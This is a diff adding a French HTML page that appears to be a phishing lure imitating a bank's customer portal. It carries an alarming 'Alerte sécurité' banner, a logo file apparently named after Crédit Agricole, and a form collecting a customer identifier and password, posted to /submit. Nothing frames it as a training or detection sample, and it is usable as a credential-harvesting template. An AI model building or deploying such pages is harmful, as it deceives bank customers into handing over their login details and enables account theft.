@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Portail client</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Message d’alerte -->
+    <div class="alert">
+        ⚠️ Alerte sécurité : Bonjour,
+Nous vous informons que nous avons mis à disposition un nouveau
+message prioritaire dans votre espace client.
+        </div>
+
+    <!-- Logo -->
+    <img src="agricole.png" alt="Logo" class="logo">
+
+    <!-- Formulaire -->
+    <form action="/submit" method="POST">
+
+        <input type="identifiant" name="identifiant" placeholder="Identifiant" required>
+
+        <input type="Mot de passe" name="passwords" placeholder="Mot de passe" required>
+
+        <button type="submit">Continuer</button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
